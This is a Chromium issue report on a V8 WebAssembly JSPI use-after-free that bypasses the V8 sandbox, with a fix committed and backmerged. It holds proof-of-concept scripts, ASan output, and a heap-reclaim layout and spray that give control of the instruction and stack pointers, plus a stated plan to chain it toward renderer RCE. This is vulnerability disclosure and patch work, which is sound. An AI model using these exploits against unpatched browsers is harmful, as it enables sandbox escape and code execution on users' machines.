# V8 Sandbox Bypass: JSPI suspender EPT not cleared in exception-unwind path

| Field | Value |
|-------|-------|
| **Issue ID** | [501147587](https://issues.chromium.org/issues/501147587) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>WebAssembly |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | qq...@calif.io |
| **Assignee** | th...@chromium.org |
| **Created** | 2026-04-10 |
| **Bounty** | $5,000.00 |

## Description

**Type:** Memory corruption — use-after-free on out-of-sandbox memory

**Affected:** All channels since JSPI ship (`613c0434032`, M139+)

## Summary

Dangling-EPT condition occurs in `Isolate::UnwindAndFindHandler` when an exception unwinds across a JSPI stack boundary. The `FoundHandler` lambda retires JSPI stacks **without** the analogous cleanup:

```
// src/execution/isolate.cc:2706-2730 -- FoundHandler (NOT FIXED)
wasm::StackMemory* active_stack = isolate_data_.active_stack();
if (active_stack != nullptr) {
  wasm::StackMemory* parent = nullptr;
  Tagged<WasmSuspenderObject> suspender =
      isolate_data()->active_suspender();
  while (active_stack != iter.wasm_stack()) {
    parent = active_stack->jmpbuf()->parent;
    SBXCHECK_EQ(parent->jmpbuf()->state, wasm::JumpBuffer::Inactive);
    ...
    SwitchStacks<wasm::JumpBuffer::Retired, wasm::JumpBuffer::Inactive>(
        active_stack, parent, kNullAddress, kNullAddress, kNullAddress);
    if (suspender->has_parent() && parent == suspender->parent()->stack()) {
      // [BUG] Old suspender abandoned without set_stack(this, nullptr)
      suspender = suspender->parent();
    }
    // Only clears WasmStackObject's EPT, not WasmSuspenderObject's:
    RetireWasmStack(active_stack);
    active_stack = parent;
  }
  ...
  // Old suspender is no longer active_suspender, but its EPT entry
  // still points at the now-pooled StackMemory.
  isolate_data()->set_active_suspender(suspender);
}

```

Two in-sandbox objects hold External Pointer Table entries pointing to the same `wasm::StackMemory*` (process memory): `WasmStackObject` and `WasmSuspenderObject`. `RetireWasmStack` clears one but not the other:

```
// src/execution/isolate.cc:4439 -- RetireWasmStack
void Isolate::RetireWasmStack(wasm::StackMemory* stack) {
  if (!stack->stack_obj().is_null()) {
    // Clear the owning {WasmStackObject}'s external pointer to prevent a UAF.
    stack->stack_obj()->set_stack(this, nullptr);   // WasmStackObject: cleared
    stack->set_stack_obj({});
  }
  // WasmSuspenderObject is not reachable from `stack` -- it lives elsewhere
  // and is the caller's responsibility. The throw path forgets this.
  ...
  stack_pool().Add(...);   // StackMemory goes to the freelist
}

```

After the loop, an attacker with the standard sandbox-bypass prerequisite (arbitrary in-sandbox read/write) can keep the abandoned suspender reachable via its `WasmResumeData` (the in-sandbox object holding the suspender's TPT handle, reachable from the resume callback's `SharedFunctionInfo.function_data`). When the pooled `StackMemory` is later freed:

```
// src/heap/heap.cc:1211-1216 -- GarbageCollectionEpilogueInSafepoint
// ShouldReduceMemory() is true when GCFlag::kReduceMemoryFootprint is set,
// which happens on OS memory pressure / LowMemoryNotification.
if (ShouldReduceMemory()) {
  memory_allocator_->ReleasePooledChunksImmediately();
#if V8_ENABLE_WEBASSEMBLY
  // freelist_.clear() runs ~unique_ptr<StackMemory> on every pooled stack,
  // which runs ~StackMemory() and then operator delete on the struct.
  isolate_->stack_pool().ReleaseFinishedStacks();
#endif
}

```

...the EPT entry resolves to freed process-heap memory. Calling the saved resume callback dereferences the dangling pointer:

```
// src/execution/isolate.cc:4363 -- Isolate::SwitchStacks<Inactive, Suspended>
// `to` is suspender->stack(): a freed StackMemory* outside the sandbox.
// jmpbuf() returns &jmpbuf_, an inline member of the freed 184-byte struct.

SBXCHECK_EQ(to->jmpbuf()->state, expected_target_state);   // UAF read
to->jmpbuf()->state = wasm::JumpBuffer::Active;            // UAF write
isolate_data()->set_active_stack(to);
if constexpr (is_resume) {
  wasm::StackMemory* tail = to;
  while (tail->jmpbuf()->parent != nullptr) {              // UAF pointer walk
    tail = tail->jmpbuf()->parent;
  }
  tail->jmpbuf()->parent = from;                           // controlled write
}

```

With heap grooming, the freed slot can be reclaimed with `state = Suspended` (= 1) and attacker-controlled `sp`/`fp`/`pc`. After `SwitchStacks` returns, `Builtins_WasmResume` calls `LoadJumpBuffer(stack, true)` which emits `mov rsp, [stack+24]; mov rbp, [stack+32]; jmp [stack+40]`.

## Reachability

JSPI is unconditionally enabled (`613c0434032`, 2025-09-17). The unwind loop is entered when the stack-frame iterator walks past the WASM\_JSPI frame at the bottom of a secondary stack instead of stopping there:

```
// src/execution/isolate.cc:2786-2802 -- UnwindAndFindHandler
if (iter.frame()->type() == StackFrame::WASM_JSPI) {
  if (catchable_by_js && iter.frame()->LookupCode()->builtin_id() !=
                             Builtin::kJSToWasmStressSwitchStacksAsm) {
    // Normal path: the WASM_JSPI frame catches the exception and rejects
    // the promise. iter stops here, so iter.wasm_stack() == active_stack
    // and FoundHandler's loop condition is false. Loop never entered.
    ...
    return FoundHandler(iter, ..., iter.frame()->sp(), iter.frame()->fp(), ...);
  } else {
    // !catchable_by_js (termination) OR --stress-wasm-stack-switching:
    // skip the frame, keep walking onto the parent stack. iter.wasm_stack()
    // ends up on the parent stack, active_stack is still the secondary
    // stack, and the loop runs.
    continue;
  }
}

```

So the loop fires only for `!is_catchable_by_javascript(exception)`, which is true only for the termination exception. From web content this is `worker.terminate()` while the worker is inside `WebAssembly.promising()`.

The PoC uses `%TerminateExecution()` and `gc({flavor:'last-resort'})` as deterministic stand-ins for `worker.terminate()` and OS memory pressure respectively; the underlying V8 code paths are identical (`v8::Isolate::TerminateExecution()` and `Heap::CollectAllAvailableGarbage()` with `kReduceMemoryFootprint`).

## Repro

```
// Flags: --sandbox-testing --allow-natives-syntax --expose-gc

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');
d8.file.execute('test/mjsunit/sandbox/wasm-jspi.js');

let builder = new WasmModuleBuilder();
let resolve_p;
let p = new Promise(r => resolve_p = r);
let suspending = new WebAssembly.Suspending(() => p);
let suspend_idx = builder.addImport("m", "suspend", kSig_v_v);
let terminate = () => { %TerminateExecution(); };
let term_idx = builder.addImport("m", "terminate", kSig_v_v);

builder.addFunction("main", kSig_v_v)
  .addBody([
    kExprCallFunction, suspend_idx,
    kExprCallFunction, term_idx,
  ]).exportFunc();

let instance = builder.instantiate({m: {suspend: suspending, terminate}});
let promising = WebAssembly.promising(instance.exports.main);

// Stage 1: suspend.
promising();
let resume_data = get_resume_data(p);
let resume_cb = Sandbox.getObjectAt(
    getField(getField(getPtr(p), kJSPromiseReactionsOrResultOffset),
             kPromiseReactionFulfillHandlerOffset));
print("[*] suspender handle: 0x" + get_suspender(resume_data).toString(16));

// Resolve the suspender's EPT now to learn where the StackMemory* lives.
// (We can't read the EPT directly from in-sandbox, but we can observe via
//  trace flags or just blast ahead.)

setTimeout(() => {
  // Stage 3: stack_X is in the pool, suspender EPT was NOT cleared.
  print("[*] post-term: handle still 0x" + get_suspender(resume_data).toString(16));

  // Stage 4: free everything in the pool. ~StackMemory deletes segments
  // (munmap of stack pages) and operator-deletes the struct.
  print("[*] gc(last-resort) → ReleaseFinishedStacks → ~StackMemory");
  gc({type:'major', execution:'sync', flavor:'last-resort'});

  // Stage 5: resume via dangling EPT.
  //
  // EPT resolves to the freed StackMemory* (process heap, outside sandbox).
  // SwitchStacks<Inactive,Suspended> at isolate.cc:4363 reads
  // to->jmpbuf()->state from freed memory. Under ASan this is the violation
  // directly (poisoned read at out-of-sandbox addr). Without ASan, spray
  // 184-byte allocations with state=1 at +68 to reach LoadJumpBuffer →
  // controlled rsp/rbp/rip from sp(+24)/fp(+32)/pc(+40).
  //
  // Layout extracted from ASan report:
  //   sizeof(StackMemory) = 184
  //   jmpbuf_.state       = +68  (Suspended = 1)
  //   jmpbuf_.sp          = +24  (kStackSpOffset)
  //   jmpbuf_.fp          = +32
  //   jmpbuf_.pc          = +40
  //   jmpbuf_.parent      = +56  (must satisfy SBXCHECK_EQ(parent->state, Inactive))
  print("[*] resuming via dangling EPT (struct freed)...");
  resume_cb(undefined);
  print("[!] no violation — non-ASan build, add 184-byte spray with state=1 @+68");
}, 0);

// Stage 2: terminate → cross-stack unwind → bug.
print("[*] resolving → terminate");
resolve_p();

```
```
out/SBX/d8 --sandbox-testing --allow-natives-syntax --expose-gc \
  wasm-jspi-uaf-throw-evict.js

```

Output:

```
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
Sandbox bounds: [0x73fb00000000,0x74fb00000000)
[*] suspender handle: 0x41b400
[*] resolving → terminate
[*] post-term: handle still 0x41b400
[*] gc(last-resort) → ReleaseFinishedStacks → ~StackMemory
[*] resuming via dangling EPT (struct freed)...
=================================================================
==1898520==ERROR: AddressSanitizer: heap-use-after-free on address 0x7643c09e1084 at pc 0x5d7c81b9f9f1 bp 0x7ffc704348a0 sp 0x7ffc70434898
READ of size 4 at 0x7643c09e1084 thread T0
    #0 0x5d7c81b9f9f0 in void v8::internal::Isolate::SwitchStacks<(v8::internal::wasm::JumpBuffer::StackState)2, (v8::internal::wasm::JumpBuffer::StackState)1>(v8::internal::wasm::StackMemory*, v8::internal::wasm::StackMemory*, unsigned long, unsigned long, unsigned long) src/execution/isolate.cc:4363:29
    #1 0x5d7c864df28a in Builtins_WasmResume setup-isolate-deserialize.cc
    #2 0x5d7c86432902 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #3 0x5d7c8642f69b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #4 0x5d7c8642f3ea in Builtins_JSEntry setup-isolate-deserialize.cc
    #5 0x5d7c81b71ef4 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/simulator.h:216:12
    #6 0x5d7c81b6f8c6 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, v8::base::Vector<v8::internal::DirectHandle<v8::internal::Object> const>) src/execution/execution.cc:565:10
    #7 0x5d7c8179e8db in v8::Function::Call(v8::Isolate*, v8::Local<v8::Context>, v8::Local<v8::Value>, int, v8::Local<v8::Value>*) src/api/api.cc:5603:27
    #8 0x5d7c8151bb71 in v8::SetTimeoutTask::Run() src/d8/d8.cc:3446:19
    #9 0x5d7c866c67a2 in v8::platform::DefaultPlatform::PumpMessageLoop(v8::Isolate*, v8::platform::MessageLoopBehavior) src/libplatform/default-platform.cc:173:9
    #10 0x5d7c814fc1d9 in v8::(anonymous namespace)::ProcessMessages(v8::Isolate*, std::__Cr::function<v8::platform::MessageLoopBehavior ()> const&) src/d8/d8.cc:6739:9
    #11 0x5d7c814eea6f in v8::Shell::FinishExecuting(v8::Isolate*, v8::Global<v8::Context> const&) src/d8/d8.cc:6798:10
    #12 0x5d7c814fbaea in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6706:8
    #13 0x5d7c814fae85 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6611:18
    #14 0x5d7c814fe61b in v8::Shell::Main(int, char**) src/d8/d8.cc:7534:18
    #15 0x7943c162a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #16 0x7943c162a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #17 0x5d7c813ae029 in _start (/home/pop/sec/v8/v8/out/SBX/d8+0x1375029) (BuildId: 8abc25439eb87cef)

0x7643c09e1084 is located 68 bytes inside of 184-byte region [0x7643c09e1040,0x7643c09e10f8)
freed by thread T0 here:
    #0 0x5d7c81488002 in operator delete(void*, unsigned long) (/home/pop/sec/v8/v8/out/SBX/d8+0x144f002) (BuildId: 8abc25439eb87cef)
    #1 0x5d7c83bce852 in v8::internal::wasm::StackPool::ReleaseFinishedStacks() gen/third_party/libc++/src/include/__memory/unique_ptr.h:288:7
    #2 0x5d7c81de1d10 in v8::internal::Heap::GarbageCollectionEpilogueInSafepoint(v8::internal::GarbageCollector) src/heap/heap.cc:1214:30
    #3 0x5d7c81defa36 in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::internal::GarbageCollectionReason, char const*) src/heap/heap.cc:2433:3
    #4 0x5d7c81e283de in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags, v8::internal::PerformHeapLimitCheck, v8::internal::PerformIneffectiveMarkCompactCheck)::$_1::operator()() const src/heap/heap.cc:1641:7
    #5 0x5d7c81e27bf6 in void heap::base::Stack::SetMarkerAndCallbackImpl<v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags, v8::internal::PerformHeapLimitCheck, v8::internal::PerformIneffectiveMarkCompactCheck)::$_1>(heap::base::Stack*, void*, void const*) src/heap/base/stack.h:182:5
    #6 0x5d7c83ece982 in PushAllRegistersAndIterateStack push_registers_asm.cc
    #7 0x5d7c81de4821 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags, v8::internal::PerformHeapLimitCheck, v8::internal::PerformIneffectiveMarkCompactCheck) src/heap/base/stack.h:78:7
    #8 0x5d7c81de6efa in v8::internal::Heap::CollectAllAvailableGarbage(v8::internal::GarbageCollectionReason) src/heap/heap.cc:1439:5
    #9 0x5d7c81c17105 in v8::internal::(anonymous namespace)::InvokeGC(v8::Isolate*, v8::internal::(anonymous namespace)::GCOptions) src/extensions/gc-extension.cc:214:17
    #10 0x5d7c81c16592 in v8::internal::GCExtension::GC(v8::FunctionCallbackInfo<v8::Value> const&) src/extensions/gc-extension.cc:304:7
    #11 0x5d7c864346e3 in Builtins_CallApiCallbackGeneric setup-isolate-deserialize.cc
    #12 0x5d7c86432902 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #13 0x5d7c8642f69b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #14 0x5d7c8642f3ea in Builtins_JSEntry setup-isolate-deserialize.cc
    #15 0x5d7c81b71ef4 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/simulator.h:216:12
    #16 0x5d7c81b6f8c6 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, v8::base::Vector<v8::internal::DirectHandle<v8::internal::Object> const>) src/execution/execution.cc:565:10
    #17 0x5d7c8179e8db in v8::Function::Call(v8::Isolate*, v8::Local<v8::Context>, v8::Local<v8::Value>, int, v8::Local<v8::Value>*) src/api/api.cc:5603:27
    #18 0x5d7c8151bb71 in v8::SetTimeoutTask::Run() src/d8/d8.cc:3446:19
    #19 0x5d7c866c67a2 in v8::platform::DefaultPlatform::PumpMessageLoop(v8::Isolate*, v8::platform::MessageLoopBehavior) src/libplatform/default-platform.cc:173:9
    #20 0x5d7c814fc1d9 in v8::(anonymous namespace)::ProcessMessages(v8::Isolate*, std::__Cr::function<v8::platform::MessageLoopBehavior ()> const&) src/d8/d8.cc:6739:9
    #21 0x5d7c814eea6f in v8::Shell::FinishExecuting(v8::Isolate*, v8::Global<v8::Context> const&) src/d8/d8.cc:6798:10
    #22 0x5d7c814fbaea in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6706:8
    #23 0x5d7c814fae85 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6611:18
    #24 0x5d7c814fe61b in v8::Shell::Main(int, char**) src/d8/d8.cc:7534:18
    #25 0x7943c162a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #26 0x7943c162a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #27 0x5d7c813ae029 in _start (/home/pop/sec/v8/v8/out/SBX/d8+0x1375029) (BuildId: 8abc25439eb87cef)

previously allocated by thread T0 here:
    #0 0x5d7c814873fd in operator new(unsigned long) (/home/pop/sec/v8/v8/out/SBX/d8+0x144e3fd) (BuildId: 8abc25439eb87cef)
    #1 0x5d7c83bcdfaa in v8::internal::wasm::StackPool::GetOrAllocate() src/wasm/stacks.h:64:41
    #2 0x5d7c83949ccb in v8::internal::Runtime_WasmAllocateSuspender(int, unsigned long*, v8::internal::Isolate*) src/runtime/runtime-wasm.cc:1316:29
    #3 0x5d7c864e7875 in Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit setup-isolate-deserialize.cc
    #4 0x5d7c865ca3dd in Builtins_WasmPromising setup-isolate-deserialize.cc
    #5 0x5d7c86432902 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #6 0x5d7c8642f69b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #7 0x5d7c8642f3ea in Builtins_JSEntry setup-isolate-deserialize.cc
    #8 0x5d7c81b71ef4 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/simulator.h:216:12
    #9 0x5d7c81b73468 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:575:10
    #10 0x5d7c8177a0db in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:2042:7
    #11 0x5d7c814b6fa7 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1041:44
    #12 0x5d7c814ef549 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5682:10
    #13 0x5d7c814fba4d in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6703:37
    #14 0x5d7c814fae85 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6611:18
    #15 0x5d7c814fe61b in v8::Shell::Main(int, char**) src/d8/d8.cc:7534:18
    #16 0x7943c162a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #17 0x7943c162a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #18 0x5d7c813ae029 in _start (/home/pop/sec/v8/v8/out/SBX/d8+0x1375029) (BuildId: 8abc25439eb87cef)

SUMMARY: AddressSanitizer: heap-use-after-free src/execution/isolate.cc:4363:29 in void v8::internal::Isolate::SwitchStacks<(v8::internal::wasm::JumpBuffer::StackState)2, (v8::internal::wasm::JumpBuffer::StackState)1>(v8::internal::wasm::StackMemory*, v8::internal::wasm::StackMemory*, unsigned long, unsigned long, unsigned long)
Shadow bytes around the buggy address:
  0x7643c09e0e00: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
  0x7643c09e0e80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa
  0x7643c09e0f00: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
  0x7643c09e0f80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa
  0x7643c09e1000: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
=>0x7643c09e1080:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa
  0x7643c09e1100: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
  0x7643c09e1180: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7643c09e1200: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
  0x7643c09e1280: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7643c09e1300: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==1898520==ABORTING

## V8 sandbox violation detected!

```
## Impact

This could be chained with [crbug.com/500880819](https://crbug.com/500880819) (also reported by me) to achieve RCE in the renderer. I will update here if the attempt succeeds.

## Layout for non-ASan exploitation

From the ASan report (`184-byte region`, fault at `+68`) and `src/wasm/stacks.h`:

```
// src/wasm/stacks.h -- JumpBuffer is an inline member of StackMemory
struct JumpBuffer {
  Address sp;                        // StackMemory+24, loaded into rsp
  Address fp;                        // StackMemory+32, loaded into rbp
  Address pc;                        // StackMemory+40, jmp target
  void* stack_limit;                 // StackMemory+48
  StackMemory* parent = nullptr;     // StackMemory+56, walked (see below)
  bool is_on_central_stack;          // StackMemory+64
  enum StackState : int32_t { Active, Suspended, Inactive, Retired };
  StackState state;                  // StackMemory+68, must be Suspended (=1)
};

```

Reclaim constraints for the 184-byte slot:

- `+68 = 1` to pass the `SBXCHECK_EQ(state, Suspended)` shown above
- `+56` must either be `nullptr` (loop exits immediately) or point to a second controlled buffer with `+68 = 2` (`Inactive`); the `while (tail->jmpbuf()->parent)` walk dereferences the chain
- `+24/+32/+40` are the payload

## Suggested fix

```
while (active_stack != iter.wasm_stack()) {
  parent = active_stack->jmpbuf()->parent;
  SBXCHECK_EQ(parent->jmpbuf()->state, wasm::JumpBuffer::Inactive);
  ...
  SwitchStacks<Retired, Inactive>(active_stack, parent, ...);
  if (suspender->has_parent() && parent == suspender->parent()->stack()) {
    suspender->set_stack(this, nullptr);   // ADDED: clear before abandoning
    suspender = suspender->parent();
  }
  RetireWasmStack(active_stack);
  active_stack = parent;
}

```

---

Quang Luong of Calif.IO in collaboration with Claude and Anthropic Research

## Attachments

- [chain-v3.js](attachments/chain-v3.js) (text/javascript, 14.8 KB)
- [derive-constants.sh](attachments/derive-constants.sh) (text/x-sh, 7.4 KB)

## Timeline

### ch...@google.com (2026-04-10)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-04-10)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must match or exceed severity.

### is...@chromium.org (2026-04-10)

Thank you for the report.

Which gn args and V8 revision did you use? I'm getting:

```
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
Sandbox bounds: [0x25c800000000,0x26c800000000)
[*] suspender handle: 0x41b600
[*] resolving → terminate
[*] post-term: handle still 0x41b600
[*] gc(last-resort) → ReleaseFinishedStacks → ~StackMemory
[*] resuming via dangling EPT (struct freed)...


#
# Safely terminating process
# The following harmless error was encountered: Check failed: to->jmpbuf()->state == expected_target_state.
#

```

### qq...@calif.io (2026-04-10)

Hello,

Did you compile v8 with ASAN?

Without ASAN, this should trigger a sandbox violation:

```
// Flags: --sandbox-testing --allow-natives-syntax --expose-gc

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');
d8.file.execute('test/mjsunit/sandbox/wasm-jspi.js');

let builder = new WasmModuleBuilder();
let resolve_p;
let p = new Promise(r => resolve_p = r);
let suspending = new WebAssembly.Suspending(() => p);
let suspend_idx = builder.addImport("m", "suspend", kSig_v_v);
let terminate = () => { %TerminateExecution(); };
let term_idx = builder.addImport("m", "terminate", kSig_v_v);

builder.addFunction("main", kSig_v_v)
  .addBody([
    kExprCallFunction, suspend_idx,
    kExprCallFunction, term_idx,
  ]).exportFunc();

let instance = builder.instantiate({m: {suspend: suspending, terminate}});
let promising = WebAssembly.promising(instance.exports.main);

promising();
let resume_data = get_resume_data(p);
let resume_cb = Sandbox.getObjectAt(
    getField(getField(getPtr(p), kJSPromiseReactionsOrResultOffset),
             kPromiseReactionFulfillHandlerOffset));
print("[*] suspender TPT handle: 0x" + get_suspender(resume_data).toString(16));

const kStackMemorySize = 184;
let payload = new Uint8Array(kStackMemorySize);
let dv = new DataView(payload.buffer);

payload.set([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00], 0);  // magic+ver
payload[8]  = 0x00;
payload[9]  = 0xAD;
payload[10] = 0x01;
payload[11] = 0x00;
dv.setBigUint64(24, 0x4141414141414141n, true);
dv.setBigUint64(32, 0x4242424242424242n, true);
dv.setBigUint64(40, 0x0000133700001337n, true);
dv.setUint32(68, 1, true);
setTimeout(() => {
  print("[*] post-term: TPT handle still 0x" +
        get_suspender(resume_data).toString(16));


  print("[*] gc(last-resort) → ReleaseFinishedStacks → operator delete(184)");
  gc({type: 'major', execution: 'sync', flavor: 'last-resort'});


  print("[*] new WebAssembly.Module(184) → operator new[](184) → same slot");
  let reclaim = new WebAssembly.Module(payload);

  print("[*] resuming — expect SEGV @ pc=0x133700001337 (out-of-sandbox)");
  resume_cb(undefined);


  print("[!] returned cleanly — reclaim missed");
}, 0);

print("[*] resolving → terminate → cross-stack unwind");
resolve_p();

```

---

My ASAN build:

```
❯ cat out/SBX/args.gn
dcheck_always_on = false
is_asan = true
is_clang = true
is_component_build = false
is_debug = false
is_lsan = false
symbol_level = 1
target_cpu = "x64"
use_remoteexec = false
v8_enable_test_features = true
v8_enable_memory_corruption_api = true

```

Non ASAN release:

```
❯ cat out/RELEASE/args.gn
dcheck_always_on = false
is_clang = true
is_component_build = false
is_debug = false
symbol_level = 1
target_cpu = "x64"
use_remoteexec = false
v8_enable_test_features = true
v8_enable_memory_corruption_api = true

```

I am on commit 31b353261e41a9d15c829359b0d4d9e261debeb6 from April 4, 2026.

### cl...@appspot.gserviceaccount.com (2026-04-14)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6522853302239232.

### is...@chromium.org (2026-04-14)

Thanks! Repro from [#comment5](https://issues.chromium.org/issues/501147587#comment5) worked for me.

Thibaud, could you please help with finding the right owner for this issue.

### dx...@google.com (2026-04-15)

Project: v8/v8  

Branch:  main  

Author:  Thibaud Michaud [thibaudm@chromium.org](mailto:thibaudm@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7762030>

[wasm][jspi] Clear suspender EPT entry on unwind

---


Expand for full commit details
```
     
    Similar to: 
     
    "7607183: [jspi] Clear EPT entry on stack return" 
    https://chromium-review.git.corp.google.com/c/v8/v8/+/7607183 
     
    But the external pointer also needs to be cleared when we exit the 
    suspender because of a thrown exception. 
     
    R=jkummerow@chromium.org 
     
    Fixed: 501147587 
    Change-Id: Ib5e3a1d9a94831c4fb09a0b7553fb0c0d3aa0f0a 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7762030 
    Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
    Reviewed-by: Jakob Kummerow <jkummerow@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#106503}

```

---

Files:

- M `src/execution/isolate.cc`
- A `test/mjsunit/sandbox/regress-501147587.js`

---

Hash: [13c7629466fa3081df011d95cf35a20ed4b7fc63](https://chromiumdash.appspot.com/commit/13c7629466fa3081df011d95cf35a20ed4b7fc63)  

Date: Wed Apr 15 10:08:44 2026


---

### sa...@google.com (2026-04-16)

Thanks for the report and the fix! I think this fix would be worth backmerging it as the bug allows breaking out of the V8 Sandbox, and because the fix looks quite simple. I'll set the corresponding labels.

### ch...@google.com (2026-04-16)

**M147** merge request created. **Please update [crbug/503208126](https://crbug.com/503208126) to have this merge reviewed.**

### ch...@google.com (2026-04-16)

**M148** merge request created. **Please update [crbug/503208841](https://crbug.com/503208841) to have this merge reviewed.**

### dx...@google.com (2026-04-16)

Project: v8/v8  

Branch:  refs/branch-heads/14.8  

Author:  Thibaud Michaud [thibaudm@chromium.org](mailto:thibaudm@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7766333>

[M148] [wasm][jspi] Clear suspender EPT entry on unwind

---


Expand for full commit details
```
     
    Original change's description: 
    > [wasm][jspi] Clear suspender EPT entry on unwind 
    > 
    > Similar to: 
    > 
    > "7607183: [jspi] Clear EPT entry on stack return" 
    > https://chromium-review.git.corp.google.com/c/v8/v8/+/7607183 
    > 
    > But the external pointer also needs to be cleared when we exit the 
    > suspender because of a thrown exception. 
    > 
    > R=jkummerow@chromium.org 
    > 
    > Fixed: 501147587 
    > Change-Id: Ib5e3a1d9a94831c4fb09a0b7553fb0c0d3aa0f0a 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7762030 
    > Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
    > Reviewed-by: Jakob Kummerow <jkummerow@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#106503} 
     
    (cherry picked from commit 13c7629466fa3081df011d95cf35a20ed4b7fc63) 
     
    Bug: 503208841,501147587 
    Change-Id: Ib5e3a1d9a94831c4fb09a0b7553fb0c0d3aa0f0a 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7766333 
    Bot-Commit: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com> 
    Auto-Submit: chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com <chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com> 
    Commit-Queue: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/14.8@{#8} 
    Cr-Branched-From: f9659283a5f8d42b3c09228cf5df606fcaf47a3d-refs/heads/14.8.178@{#1} 
    Cr-Branched-From: 141232520dc4910401240c531db3af36910a0fd1-refs/heads/main@{#106240}

```

---

Files:

- M `src/execution/isolate.cc`
- A `test/mjsunit/sandbox/regress-501147587.js`

---

